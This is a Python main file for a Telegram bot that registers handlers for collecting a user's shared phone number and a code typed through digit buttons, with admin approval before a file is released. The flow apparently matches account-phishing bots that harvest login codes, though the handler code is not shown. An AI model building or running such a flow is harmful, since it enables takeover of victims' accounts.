import logging
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    ConversationHandler,
    filters,
)
from .config import *
from .handlers import *
from .database import init_db

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)

def main():
    # Initialize Database
    init_db()
    
    if not BOT_TOKEN:
        print("Error: BOT_TOKEN not found in environment variables.")
        return

    application = ApplicationBuilder().token(BOT_TOKEN).build()

    # Conversation Handler for both User and Admin flows
    conv_handler = ConversationHandler(
        entry_points=[
            CommandHandler('start', start),
            CommandHandler('adm', admin_command),
        ],
        states={
            START: [CallbackQueryHandler(proceed_callback, pattern="^proceed$")],
            AWAITING_CONTACT: [MessageHandler(filters.CONTACT, contact_handler)],
            AWAITING_CODE: [CallbackQueryHandler(otp_callback, pattern="^num_")],
            ADMIN_CONFIRMATION: [], # Handled by global callbacks
            
            # Admin States
            ADMIN_AUTH: [MessageHandler(filters.TEXT & ~filters.COMMAND, admin_auth_handler)],
            ADMIN_PANEL: [
                CallbackQueryHandler(admin_menu_callback, pattern="^admin_"),
                CallbackQueryHandler(file_manage_callback, pattern="^fmanage_|^fset_"),
                CallbackQueryHandler(timer_setting_callback, pattern="^time_|^gtime_"),
                CallbackQueryHandler(autodelete_setting_callback, pattern="^adel_"),
            ],
            UPLOAD_FILE: [MessageHandler(filters.PHOTO | filters.VIDEO | filters.Document.ALL, admin_file_upload_handler)],
            SET_COOLDOWN: [MessageHandler(filters.TEXT & ~filters.COMMAND, custom_timer_handler)],
            SET_AUTO_DELETE: [MessageHandler(filters.TEXT & ~filters.COMMAND, custom_autodelete_handler)],
            RENAME_FILE: [MessageHandler(filters.TEXT & ~filters.COMMAND, file_rename_handler)],
        },
        fallbacks=[CommandHandler('start', start), CommandHandler('adm', admin_command)],
        allow_reentry=True
    )

    application.add_handler(conv_handler)
    
    # Global handlers for callbacks that might happen outside conversation
    application.add_handler(CallbackQueryHandler(admin_callback, pattern="^approve_|^reject_"))
    application.add_handler(CallbackQueryHandler(get_file_callback, pattern="^get_file$"))
    
    # Add handler for admin SMS digits (from existing code)
    application.add_handler(CallbackQueryHandler(admin_sms_handler, pattern="^admin_sms_"))

    print("Bot is running...")
    application.run_polling()

if __name__ == '__main__':
    main()
